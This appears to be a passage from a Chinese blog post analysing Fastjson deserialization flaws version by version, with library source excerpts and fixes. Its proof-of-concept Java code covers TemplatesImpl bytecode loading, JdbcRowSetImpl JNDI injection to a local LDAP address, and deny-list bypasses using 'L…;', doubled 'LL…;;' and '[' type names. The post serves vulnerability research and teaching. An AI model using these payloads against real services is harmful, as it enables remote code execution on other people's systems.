<p><font style="color:#000000;">为了满足漏洞点触发之前不报异常及退出，还需要</font><strong><font style="color:#000000;">满足_name不为null，_tfactory不为null</font></strong><font style="color:#000000;">。同时，由于Payload需要赋值的一些属性为private类型，</font><strong><font style="color:#000000;">需要在parse反序列化时设置第二个参数Feature.SupportNonPublicField</font></strong><font style="color:#000000;">来让服务端从JSON中恢复private类型的属性。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734937642256-3510586a-de4a-47f7-bd74-e55428e0c715.png"></p>
<p><font style="color:#000000;">除此之外，由于传入的_bytecodes为bytes类型，而Fastjson在解析的时候会对bytes类型进行Base64解码，因此</font><strong><font style="color:#000000;">需要将恶意类的字节码Base64编码</font></strong><font style="color:#000000;">。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734937558578-1fe215e0-4227-4745-b9d3-4bca0c62f7fc.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p><font style="color:#000000;">在com.sun.rowset.JdbcRowSetImpl#connect方法中，当this.conn为null且dataSource不为null时，会调用javax.naming.InitialContext#lookup方法来触发JNDI注入，且参数为dataSource。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734938610334-d429eb5e-8f43-43e1-9545-7f9e12d09d5c.png"></p>
<p><font style="color:#000000;">而com.sun.rowset.JdbcRowSetImpl#setAutoCommit方法会调用connect方法，且满足上文提到的setter方法的要求。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:1037/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h3><blockquote>
<p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41，官方对之前的反序列化漏洞进行了修复，引入了checkAutoType安全机制，默认情况下autoTypeSupport关闭，不能直接反序列化任意类，而打开AutoType之后，是基于内置黑名单来实现安全的，fastjson也提供了添加黑名单的接口。</font></p>
</blockquote>
<p><font style="color:#000000;">在1.2.24版本会直接加载@type指向的类，而1.2.25版本增加了对类的检查，在com.alibaba.fastjson.parser.ParserConfig类中，对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数AutoTypeSupport。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    ref = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="built_in">this</span>.config.checkAutoType(ref, (Class)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">黑名单denyList包括：</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.denyList = <span class="string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span>.split(<span class="string">&quot;,&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">添加反序列化白名单有3种方法：</font></p>
<ol>
<li><font style="color:#000000;">使用代码进行添加，ParserConfig.getGlobalInstance().addAccept(“org.example.fastjson.poc”)</font></li>
<li><font style="color:#000000;">加上JVM启动参数，-Dfastjson.parser.autoTypeAccept&#x3D;org.example.fastjson</font></li>
<li><font style="color:#000000;">在fastjson.properties中添加，fastjson.parser.autoTypeAccept&#x3D;org.example.fastjson</font></li>
</ol>
<p><font style="color:#000000;">跟进一下checkAutoType方法，如果开启了autoType，先判断类名是否在白名单中，如果在，使用TypeUtils#loadClass方法加载，然后使用黑名单判断类名的开头，如果匹配就抛出异常。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    String deny;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="built_in">this</span>.acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="built_in">this</span>.denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进一下com.alibaba.fastjson.util.TypeUtils#loadClass方法，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的[、L、;字符，这也同时导致了逻辑漏洞，攻击者可以使用带有描述符的类绕过黑名单的限制，而在类加载过程中，描述符会被处理掉。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两种潜在的绕过方式如下：</p>
<ul>
<li>如果以[开头则去掉[后进行类加载（在之前Fastjson已经判断过是否为数组了，实际走不到这一步）</li>
<li>如果以L开头，以;结尾，则去掉开头和结尾进行类加载</li>
</ul>
<p><font style="color:#000000;">因此，漏洞利用思路为，</font><strong><font style="color:#000000;">开启autoType，在类名中以L开头和;结尾绕过黑名单</font></strong><font style="color:#000000;">。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h3><blockquote>
<p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42，在1.2.42版本中，Fastjson继续延续了黑白名单的检测模式，但是为了防止安全研究人员根据黑名单中的类进行反向研究，将黑名单类从白名单修改为使用HASH的方式进行对比。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</font></p>
</blockquote>
<p><font style="color:#000000;">在com.alibaba.fastjson.parser.ParserConfig类中，作者将原本的明文黑名单转为使用了Hash的黑名单来防止安全人员对其研究。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734941786228-1e88fde6-e19c-46d2-be7d-0592729c1e50.png"></p>
<p><font style="color:#000000;">在checkAutoType方法中加入判断，如果类的第一个字符是L且结尾是;，则使用substring进行去除。但是这存在一个致命的问题，由于在最后处理时是递归处理，只进行了一次判断并去除，可以利用双写来进行绕过。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h3><blockquote>
<p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43，在1.2.43版本中，作者修复上一个版本中双写绕过的问题。</font></p>
</blockquote>
<p><font style="color:#000000;">可以看到用来检查的checkAutoType方法添加了判断，如果类名连续出现了两个L将会抛出异常。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"><span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line"><span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">但是在TypeUtils#loadClass方法中，针对[也进行了处理和递归，利用[依旧可以进行黑名单的绕过，根据报错信息，按照格式解析要求构造Payload即可。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734943478841-70c4e764-3299-4c5e-8c6a-3bf1e7dfbdce.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc43</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;[&#123;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h3><blockquote>
<p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.44，在此版本将[绕过也进行了修复，由字符串处理导致的黑名单绕过告一段落。</font></p>
</blockquote>
<p><font style="color:#000000;">在checkAutoType方法中添加了新的判断，如果类名以[开始则直接抛出异常。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"><span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h3><blockquote>
<p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45，在此版本爆出了一个黑名单绕过。</font></p>
</blockquote>
<p><font style="color:#000000;">该版本爆出的黑名单绕过为通过mybatis组件进行JNDI接口调用，在org.apache.ibatis.datasource.jndi.JndiDataSourceFactory#setProperties方法中，存在JNDI注入，进而可以加载恶意类。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734944059796-518382bc-2a14-4794-b2b5-645ef2a1135b.png"></p>
